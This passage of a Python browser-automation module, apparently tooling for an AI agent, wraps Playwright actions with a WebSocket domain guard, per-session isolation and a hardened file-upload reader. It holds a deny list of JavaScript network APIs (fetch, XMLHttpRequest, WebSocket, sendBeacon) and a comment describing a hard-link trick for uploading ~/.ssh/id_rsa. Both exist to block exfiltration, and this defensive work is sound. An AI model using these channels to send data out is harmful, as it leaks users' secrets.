            raise RuntimeError(
                "Playwright build is too old to enforce the WebSocket "
                "route guard — install playwright>=1.48 and run "
                "'playwright install chromium'.  Refusing to create an "
                "unguarded context."
            )

        async def _ws_handler(ws_route: Any) -> None:
            try:
                # ``WebSocketRoute`` exposes ``.url`` directly (unlike
                # ``Route`` which exposes ``.request.url``).  It also
                # uses ``close()`` instead of ``abort()`` to reject the
                # connection — calling ``abort`` raises AttributeError
                # which would let the WS through.
                url = ws_route.url
                # ws:// and wss:// are the only WebSocket schemes; reject
                # anything else (defensive — Playwright should never
                # surface a non-ws URL here).
                lower_url = url.lower()
                if not (lower_url.startswith("ws://") or lower_url.startswith("wss://")):
                    await ws_route.close(code=1008, reason="blocked by guard")
                    return
                parsed = urlparse(url)
                domain = parsed.hostname or ""
                if domain:
                    result = await guard.check_resolved_url(url)
                    if not result.allowed:
                        await ws_route.close(code=1008, reason="blocked by guard")
                        logger.info(
                            "B2 ws route guard blocked WebSocket to %s: %s",
                            domain, result.reason,
                        )
                        return
                # WebSocketRoute is not an HTTP Route and has no continue_().
                # Connecting to the real server enables forwarding.
                ws_route.connect_to_server()
            except Exception as exc:  # noqa: BLE001 — never let the
                # handler raise into Playwright.
                logger.warning("B2 ws route guard error: %s", exc)
                try:
                    await ws_route.close(code=1011, reason="guard error")
                except Exception:  # noqa: BLE001
                    pass

        await context.route_web_socket("**/*", _ws_handler)

    async def _safe_execute(
        self,
        real: Callable[[Page], Any],
        mock: Callable[[], Any],
        principal_id: str = "",
        *,
        session_id: str = "",
        runtime_id: str = "",
        network_guard: Any = None,
    ) -> dict[str, Any]:
        """安全执行浏览器操作：Playwright 不可用时走 ``mock``，否则走 ``real``。

        H1: ``principal_id`` selects the per-principal ``BrowserContext`` so
        different principals get isolated cookies / DOM / page state.

        H5: ``session_id`` + ``runtime_id`` extend the key so two concurrent
        local sessions under the same UID get independent contexts.

        B2: ``network_guard`` is installed on the context so every request,
        redirect and subresource is gated by the guard's domain check.

        ``real`` 接收一个 ``Page`` 并返回 ``dict``；``mock`` 无参并返回
        ``dict``。两条路径都返回 ``dict[str, Any]``。
        """
        if not _HAS_PLAYWRIGHT:
            return mock()  # mock 路径返回 dict
        page = await self.ensure_page(
            principal_id,
            session_id=session_id,
            runtime_id=runtime_id,
            network_guard=network_guard,
        )
        if page is None:
            # H2: if ``ensure_page`` stashed a specific failure reason
            # (e.g. route guard installation failed), surface it; otherwise
            # fall back to the generic "Browser not available" message.
            error = self._last_ensure_error or "Browser not available"
            self._last_ensure_error = ""
            return {"ok": False, "error": error}
        try:
            result = real(page)
            # real 可能是协程，统一 await。
            if hasattr(result, "__await__"):
                result = await result  # type: ignore[assignment]
            return result
        except Exception as exc:  # noqa: BLE001 — surfaced as error dict
            logger.error("Browser operation failed: %s", exc)
            return {"ok": False, "error": str(exc)}


# 全局单例（模块级共享，工具函数默认使用它）
_manager = BrowserManager()


# ─── 安全护栏 ───

# 简单正则：拦截明显含网络副作用的 JS 表达式（非完整沙箱，仅基础防护）。
_FORBIDDEN_JS_PATTERNS = (
    re.compile(r"\bfetch\s*\("),
    re.compile(r"\bXMLHttpRequest\b"),
    re.compile(r"\bWebSocket\b"),
    re.compile(r"\bnavigator\s*\.\s*sendBeacon\b"),
)


def _is_expression_blocked(expression: str) -> Optional[str]:
    """返回命中规则的可读说明，未命中返回 None。"""
    for pattern in _FORBIDDEN_JS_PATTERNS:
        if pattern.search(expression):
            return f"expression contains blocked network API: {pattern.pattern}"
    return None


# ─── 工具函数（每个都有 Playwright + Mock 两条路径）───


async def browser_launch(
    headless: bool = True, browser_type: str = "chromium"
) -> dict[str, Any]:
    """启动浏览器。"""
    return await _manager.launch(headless=headless, browser_type=browser_type)


async def browser_close() -> dict[str, Any]:
    """关闭浏览器并释放资源。"""
    return await _manager.close()


async def browser_navigate(
    url: str, *, principal_id: str = "",
    session_id: str = "", runtime_id: str = "", network_guard: Any = None,
) -> dict[str, Any]:
    """导航到指定 URL 并等待页面基本加载完成。

    H1: ``principal_id`` selects the per-principal ``BrowserContext`` so
    different principals (users / subagents / webhook senders) get isolated
    cookies / DOM / page state.

    H5: ``session_id`` + ``runtime_id`` extend the context key so two
    concurrent local sessions under the same UID get independent contexts.

    B2: ``network_guard`` is installed on the context via
    ``context.route("**/*")`` and gates EVERY request, redirect and
    subresource — not just the initial URL.
    """
    return await _manager._safe_execute(
        real=_make_navigate_real(url),
        mock=lambda: _navigate_mock(url),
        principal_id=principal_id,
        session_id=session_id,
        runtime_id=runtime_id,
        network_guard=network_guard,
    )


def _make_navigate_real(url: str):
    """B1: factory that binds ``url`` into the real handler's closure.

    The previous ``_navigate_real(page)`` referenced ``url`` from the
    enclosing ``browser_navigate`` scope, but ``_safe_execute`` calls
    ``real(page)`` from a different call frame — so ``url`` was undefined
    and every real navigation raised ``NameError`` at runtime.  The mock
    tests pinned ``_HAS_PLAYWRIGHT = False`` so this was never caught.
    """
    async def _run(page: Page) -> dict[str, Any]:
        await page.goto(url, wait_until="domcontentloaded", timeout=30000)
        title = await page.title()
        return {"ok": True, "url": page.url, "title": title}
    return _run


def _navigate_mock(url: str) -> dict[str, Any]:
    _MOCK_STATE.url = url
    return {"ok": True, "url": _MOCK_STATE.url}


async def browser_click(
    selector: str, *, principal_id: str = "",
    session_id: str = "", runtime_id: str = "", network_guard: Any = None,
) -> dict[str, Any]:
    """点击元素（CSS / text= / xpath=）。

    H1: ``principal_id`` selects the per-principal ``BrowserContext``.
    H5: ``session_id`` + ``runtime_id`` extend the context key.
    B2: ``network_guard`` is installed on the context and gates every
    request, redirect and subresource (closing the click→blocked-domain
    bypass).
    """
    return await _manager._safe_execute(
        real=_make_click_real(selector),
        mock=lambda: _click_mock(selector),
        principal_id=principal_id,
        session_id=session_id,
        runtime_id=runtime_id,
        network_guard=network_guard,
    )


def _make_click_real(selector: str):
    """B1: factory that binds ``selector`` into the real handler's closure."""
    async def _run(page: Page) -> dict[str, Any]:
        await page.click(selector, timeout=10000)
        try:
            await page.wait_for_load_state("domcontentloaded", timeout=5000)
        except Exception:  # noqa: BLE001 — 点击可能不触发导航，忽略超时
            pass
        return {"ok": True, "selector": selector, "url": page.url}
    return _run


def _click_mock(selector: str) -> dict[str, Any]:
    _MOCK_STATE.clicks.append(selector)
    return {"ok": True, "selector": selector}


async def browser_type(
    selector: str, text: str, press_enter: bool = False,
    *, principal_id: str = "",
    session_id: str = "", runtime_id: str = "", network_guard: Any = None,
) -> dict[str, Any]:
    """在输入框中输入文本（先清空）。

    H1: ``principal_id`` selects the per-principal ``BrowserContext``.
    H5: ``session_id`` + ``runtime_id`` extend the context key.
    B2: ``network_guard`` is installed on the context and gates every
    request, redirect and subresource (closing the type-enter→blocked-domain
    bypass).
    """
    return await _manager._safe_execute(
        real=_make_type_real(selector, text, press_enter),
        mock=lambda: _type_mock(selector, text),
        principal_id=principal_id,
        session_id=session_id,
        runtime_id=runtime_id,
        network_guard=network_guard,
    )


def _make_type_real(selector: str, text: str, press_enter: bool):
    """B1: factory that binds ``selector`` / ``text`` / ``press_enter``
    into the real handler's closure.
    """
    async def _run(page: Page) -> dict[str, Any]:
        await page.fill(selector, text)
        if press_enter:
            await page.press(selector, "Enter")
        return {"ok": True, "selector": selector, "text": text}
    return _run


def _type_mock(selector: str, text: str) -> dict[str, Any]:
    _MOCK_STATE.typed[selector] = text
    return {"ok": True, "selector": selector, "text": text}


async def browser_snapshot(
    *, principal_id: str = "",
    session_id: str = "", runtime_id: str = "", network_guard: Any = None,
) -> dict[str, Any]:
    """获取页面 DOM 快照（完整 HTML，过长截断）。

    H1: ``principal_id`` selects the per-principal ``BrowserContext`` so
    one principal cannot observe another's DOM.
    H5: ``session_id`` + ``runtime_id`` extend the context key.
    B2: ``network_guard`` is installed on the context.
    """
    return await _manager._safe_execute(
        real=_snapshot_real,
        mock=_snapshot_mock,
        principal_id=principal_id,
        session_id=session_id,
        runtime_id=runtime_id,
        network_guard=network_guard,
    )


def _snapshot_real(page: Page) -> Any:
    async def _run() -> dict[str, Any]:
        content = await page.content()
        title = await page.title()
        if len(content) > 50000:
            content = content[:50000] + "\n... (truncated, HTML too long)"
        return {"ok": True, "url": page.url, "title": title, "html": content}

    return _run()


def _snapshot_mock() -> dict[str, Any]:
    return {
        "ok": True,
        "url": _MOCK_STATE.url,
        "typed": dict(_MOCK_STATE.typed),
        "clicks": list(_MOCK_STATE.clicks),
    }


async def browser_screenshot(
    *, principal_id: str = "",
    session_id: str = "", runtime_id: str = "", network_guard: Any = None,
) -> dict[str, Any]:
    """Capture a screenshot and return base64 without filesystem writes.

    H1: ``principal_id`` selects the per-principal ``BrowserContext``.
    H5: ``session_id`` + ``runtime_id`` extend the context key.
    B2: ``network_guard`` is installed on the context.
    """
    return await _manager._safe_execute(
        real=_make_screenshot_real(),
        mock=_screenshot_mock,
        principal_id=principal_id,
        session_id=session_id,
        runtime_id=runtime_id,
        network_guard=network_guard,
    )


def _make_screenshot_real():
    """Build the in-memory screenshot handler."""
    async def _run(page: Page) -> dict[str, Any]:
        image_bytes = await page.screenshot(full_page=False)
        encoded = base64.b64encode(image_bytes).decode("ascii")
        return {"ok": True, "base64": encoded, "size_bytes": len(image_bytes)}
    return _run


def _screenshot_mock() -> dict[str, Any]:
    return {"ok": False, "error": "Screenshot not available in mock mode"}


async def browser_scroll(
    direction: str = "down", amount: int = 3, *, principal_id: str = "",
    session_id: str = "", runtime_id: str = "", network_guard: Any = None,
) -> dict[str, Any]:
    """滚动页面（每 ``amount`` 滚动 ``amount * 500`` 像素）。

    H1: ``principal_id`` selects the per-principal ``BrowserContext``.
    H5: ``session_id`` + ``runtime_id`` extend the context key.
    B2: ``network_guard`` is installed on the context.
    """
    return await _manager._safe_execute(
        real=_make_scroll_real(direction, amount),
        mock=lambda: _scroll_mock(direction, amount),
        principal_id=principal_id,
        session_id=session_id,
        runtime_id=runtime_id,
        network_guard=network_guard,
    )


def _make_scroll_real(direction: str, amount: int):
    """B1: factory that binds ``direction`` / ``amount`` into the real
    handler's closure.
    """
    async def _run(page: Page) -> dict[str, Any]:
        pixels = amount * 500
        if direction == "up":
            pixels = -pixels
        await page.evaluate(f"window.scrollBy(0, {pixels})")
        return {"ok": True, "direction": direction, "amount": amount}
    return _run


def _scroll_mock(direction: str, amount: int) -> dict[str, Any]:
    return {"ok": True, "direction": direction, "amount": amount}


async def browser_evaluate(
    expression: str, *, principal_id: str = "",
    session_id: str = "", runtime_id: str = "", network_guard: Any = None,
) -> dict[str, Any]:
    """在页面上下文中执行 JS 表达式（拦截网络类 API）。

    H1: ``principal_id`` selects the per-principal ``BrowserContext`` so
    JS executes against the caller's own cookies / DOM, not a shared pool.
    H5: ``session_id`` + ``runtime_id`` extend the context key.
    B2: ``network_guard`` is installed on the context (closing the
    evaluate→blocked-domain bypass via ``location.href=...``).
    """
    blocked = _is_expression_blocked(expression)
    if blocked:
        return {"ok": False, "error": blocked}
    return await _manager._safe_execute(
        real=_make_evaluate_real(expression),
        mock=lambda: {"ok": False, "error": "JS evaluation not available in mock mode"},
        principal_id=principal_id,
        session_id=session_id,
        runtime_id=runtime_id,
        network_guard=network_guard,
    )


def _make_evaluate_real(expression: str):
    """B1: factory that binds ``expression`` into the real handler's closure."""
    async def _run(page: Page) -> dict[str, Any]:
        result = await page.evaluate(expression)
        return {"ok": True, "result": str(result)}
    return _run


async def browser_file_upload(
    selector: str,
    file_path: str,
    *,
    workspace_root: str = "",
    network_policy: str = "none",
    principal_id: str = "",
    session_id: str = "",
    runtime_id: str = "",
    network_guard: Any = None,
) -> dict[str, Any]:
    """上传文件到 ``<input type=file>`` 元素。

    B1: the handler validates ``file_path`` is contained within
    ``workspace_root`` (no symlink escape, no arbitrary host file access),
    enforces a size limit, and rejects when network is not authorised.
    ``network_policy`` is injected by the capability broker because this
    tool declares ``network.access``; the handler rejects when network is
    not enabled (defense in depth).

    M1: the file is opened with ``O_RDONLY | O_NOFOLLOW`` and its bytes
    are read fully into memory.  Playwright receives the bytes via its
    in-memory payload API (``files=[{"name": ..., "mimeType": ...,
    "buffer": bytes}]``) — no temp file is ever created, so there is no
    TOCTOU window for a same-UID process to substitute different bytes
    between validation and upload.

    H1: ``principal_id`` selects the per-principal ``BrowserContext`` so
    the upload targets the caller's own page, not a shared pool.
    H5: ``session_id`` + ``runtime_id`` extend the context key.
    B2: ``network_guard`` is installed on the context.
    """
    # B1: reject when network is not authorised — the capability broker
    # already gates this, but defense in depth: the handler also checks.
    if network_policy != "unrestricted-with-approval":
        return {
            "ok": False,
            "error": "browser_file_upload requires network access to be enabled",
        }
    # B1: validate the file path is contained within the workspace root.
    if not workspace_root:
        return {
            "ok": False,
            "error": "browser_file_upload requires a workspace root for path validation",
        }
    # M1: read the source file bytes into memory via fd-based identity
    # binding.  Returns an error dict on failure or a (bytes, basename)
    # tuple on success.  Playwright's ``set_input_files`` accepts an
    # in-memory payload, so no temp file is ever created and there is
    # no TOCTOU window for a same-UID process to substitute different
    # bytes between validation and upload.
    read_result = _read_upload_bytes(file_path, workspace_root)
    if isinstance(read_result, dict):
        return read_result
    file_bytes, file_name = read_result
    return await _manager._safe_execute(
        real=_make_file_upload_real(selector, file_name, file_bytes),
        mock=lambda: _file_upload_mock(selector, file_path),
        principal_id=principal_id,
        session_id=session_id,
        runtime_id=runtime_id,
        network_guard=network_guard,
    )


# B1: maximum upload file size — 10 MiB.  Large enough for documents and
# images, small enough to prevent using the browser as a bulk exfiltration
# channel.
_UPLOAD_MAX_BYTES = 10 * 1024 * 1024

# M1: in-memory upload payload — no temp file, no TOCTOU window.  The
# previous flow materialized a runtime-private temp file in a 0700 dir
# under ``~/.khaos/uploads/`` and handed Playwright the temp PATH.  A
# same-UID process could still scan the 0700 directory, replace the temp
# file between ``close(temp_fd)`` and Playwright's ``open()``, and
# substitute different bytes (TOCTOU).  Reading the bytes into memory
# and passing them via Playwright's ``files=[{..., "buffer": bytes}]``
# payload API closes that window entirely.


def _read_upload_bytes(
    file_path: str, workspace_root: str
) -> "tuple[bytes, str] | dict[str, Any]":
    """M1: read one Workspace file through a fixed no-follow dirfd chain.

    The previous flow (``_materialize_upload``) copied the bytes into a
    runtime-private temp file in ``~/.khaos/uploads/`` (0700) and handed
    Playwright the temp PATH.  A same-UID process could still scan the
    0700 directory, replace the temp file between ``close(temp_fd)`` and
    Playwright's ``open()``, and substitute different bytes (TOCTOU).

    This function closes that window by reading the bytes fully into
    memory and returning them as a ``bytes`` object.  Playwright's
    ``set_input_files`` accepts an in-memory payload
    (``files=[{"name": ..., "mimeType": ..., "buffer": bytes}]``), so
    no temp file is ever created and there is no TOCTOU window.

    The function opens every Workspace-root and file-parent component with
    ``O_DIRECTORY | O_NOFOLLOW`` relative to the already-open parent.  It
    never resolves the target and later reopens it by absolute path, so a
    same-UID rename/symlink replacement of an intermediate parent cannot
    redirect the final read outside the fixed Workspace root.

    It then:

    * opens the final basename relative to the fixed parent dirfd with
      ``O_RDONLY | O_NOFOLLOW``;
    * validates with ``fstat`` that it is a regular file owned by the
      current user and under the size limit;
    * reads the bytes in chunks, enforcing the size limit DURING the
      read (a file could grow between ``fstat`` and ``read``);
    * closes the source fd immediately (before returning).

    Returns ``(bytes, basename)`` on success, or an error dict on failure.
    """
    import os as _os
    import stat as _stat

    # Windows' stdlib does not expose O_NOFOLLOW or an equivalent
    # handle-relative no-reparse-point open.  Do not weaken the upload
    # identity contract by silently following reparse points; the native
    # backend remains explicitly unavailable until it has a real no-follow
    # implementation and runner coverage.
    if (
        not hasattr(_os, "O_NOFOLLOW")
        or not hasattr(_os, "O_DIRECTORY")
        or _os.open not in _os.supports_dir_fd
    ):
        return {
            "ok": False,
            "error": (
                "secure no-follow file upload is unavailable on this platform"
            ),
            "file": file_path,
        }

    root = Path(_os.path.abspath(_os.path.expanduser(workspace_root)))
    raw_target = Path(_os.path.expanduser(file_path))
    try:
        relative = (
            raw_target.relative_to(root)
            if raw_target.is_absolute()
            else raw_target
        )
    except ValueError:
        return {
            "ok": False,
            "error": (
                "file_path is outside the workspace root; "
                "browser_file_upload may only upload files within the workspace"
            ),
            "file": file_path,
            "workspace_root": str(root),
        }
    parts = relative.parts
    if not parts or any(part in {"", ".", ".."} for part in parts):
        return {
            "ok": False,
            "error": "file_path contains an unsafe path component",
            "file": file_path,
        }

    directory_flags = _os.O_RDONLY | _os.O_DIRECTORY | _os.O_NOFOLLOW
    dirfds: list[int] = []
    try:
        current_fd = _os.open(_os.path.sep, directory_flags)
        dirfds.append(current_fd)
        for component in root.parts[1:]:
            next_fd = _os.open(component, directory_flags, dir_fd=current_fd)
            dirfds.append(next_fd)
            current_fd = next_fd
        root_stat = _os.fstat(current_fd)
        if not _stat.S_ISDIR(root_stat.st_mode):
            raise OSError("workspace root is not a directory")
        for component in parts[:-1]:
            next_fd = _os.open(component, directory_flags, dir_fd=current_fd)
            dirfds.append(next_fd)
            current_fd = next_fd
        src_fd = _os.open(
            parts[-1], _os.O_RDONLY | _os.O_NOFOLLOW, dir_fd=current_fd,
        )
    except OSError as exc:
        for descriptor in reversed(dirfds):
            try:
                _os.close(descriptor)
            except OSError:
                pass
        return {
            "ok": False,
            "error": f"secure workspace-relative open failed: {exc}",
            "file": file_path,
        }
    finally:
        for descriptor in reversed(dirfds):
            try:
                _os.close(descriptor)
            except OSError:
                pass

    try:
        st = _os.fstat(src_fd)
        if not _stat.S_ISREG(st.st_mode):
            return {
                "ok": False,
                "error": "file_path is not a regular file",
                "file": file_path,
            }
        if st.st_uid != _os.getuid():
            return {
                "ok": False,
                "error": "file_path is not owned by the current user",
                "file": file_path,
            }
        # M1: reject hard-linked files.  The no-follow dirfd chain defeats
        # symlink and parent-replacement races, but a same-UID process can
        # still hard-link ``workspace/upload.txt`` to ``~/.ssh/id_rsa``;
        # every path component is legitimate and the final inode is an
        # owner-held regular file, so without this check we would read and
        # upload an arbitrary host secret.  Require a link count of exactly
        # one before any bytes leave the process.
        if st.st_nlink != 1:
            return {
                "ok": False,
                "error": (
                    "file_path has multiple hard links and may escape the "
                    "workspace"
                ),
                "file": file_path,
                "nlink": st.st_nlink,
            }
        if st.st_size > _UPLOAD_MAX_BYTES:
            return {
                "ok": False,
                "error": (
                    f"file size {st.st_size} exceeds the upload limit "
                    f"of {_UPLOAD_MAX_BYTES} bytes"
                ),
                "file": file_path,
                "size": st.st_size,
            }
        # Read the bytes in chunks, enforcing the size limit DURING the
        # read.  A file could grow between fstat and read; we abort if
        # the running total exceeds the limit.
        chunk_size = 64 * 1024
        chunks: list[bytes] = []
        total = 0
        while True:
            chunk = _os.read(src_fd, chunk_size)
            if not chunk:
                break
            total += len(chunk)
            if total > _UPLOAD_MAX_BYTES:
                return {
                    "ok": False,
                    "error": (
                        f"file size exceeded the upload limit of "
                        f"{_UPLOAD_MAX_BYTES} bytes during read"
                    ),
                    "file": file_path,
                }
            chunks.append(chunk)
        file_bytes = b"".join(chunks)
    finally:
        _os.close(src_fd)
    return file_bytes, parts[-1]


def _make_file_upload_real(
    selector: str, file_name: str, file_bytes: bytes
) -> Callable[[Page], Any]:
    """M1: factory that binds ``file_name`` / ``file_bytes`` into the
    real handler's closure.

    The bytes are uploaded via Playwright's in-memory payload API
    (``files=[{"name": ..., "mimeType": ..., "buffer": bytes}]``) — no
    temp file, no TOCTOU window for a same-UID process to substitute
    different bytes between validation and upload.
    """
    async def _run(page: Page) -> dict[str, Any]:
        await page.set_input_files(
            selector,
            files=[{
                "name": file_name,
                "mimeType": "application/octet-stream",
                "buffer": file_bytes,
            }],
        )
        return {
            "ok": True,
            "selector": selector,
            "file": file_name,
            "size_bytes": len(file_bytes),
        }
    return _run


def _file_upload_real(
    page: Page, selector: str = "", file_path: str = "",
) -> Any:  # pragma: no cover - legacy
    # Retained for backward compatibility with any callers that import
    # the closure directly.  New code uses ``_make_file_upload_real``.
    async def _run() -> dict[str, Any]:
        await page.set_input_files(selector, file_path)
        return {"ok": True, "selector": selector, "file": file_path}
    return _run()


def _file_upload_mock(selector: str, file_path: str) -> dict[str, Any]:
    _MOCK_STATE.uploaded.append((selector, file_path))
    return {"ok": True, "selector": selector, "file": file_path}


async def browser_vision(
    *, principal_id: str = "",
    session_id: str = "", runtime_id: str = "", network_guard: Any = None,
) -> dict[str, Any]:
    """返回页面状态的文字摘要（URL + 标题）。

    H1: ``principal_id`` selects the per-principal ``BrowserContext`` so
    the summary reflects the caller's own page state, not a shared pool.
    H5: ``session_id`` + ``runtime_id`` extend the context key.
    B2: ``network_guard`` is installed on the context.
    """
    return await _manager._safe_execute(
        real=_vision_real,
        mock=_vision_mock,
        principal_id=principal_id,
        session_id=session_id,
        runtime_id=runtime_id,
        network_guard=network_guard,
    )


def _vision_real(page: Page) -> Any:
    async def _run() -> dict[str, Any]:
        title = await page.title()
        return {
            "ok": True,
            "url": page.url,
            "title": title,
            "description": f"Browser view for {page.url} ({title})",
        }

    return _run()


def _vision_mock() -> dict[str, Any]:
    return {
        "ok": True,
        "url": _MOCK_STATE.url,
        "description": f"Mock browser view for {_MOCK_STATE.url}",
    }
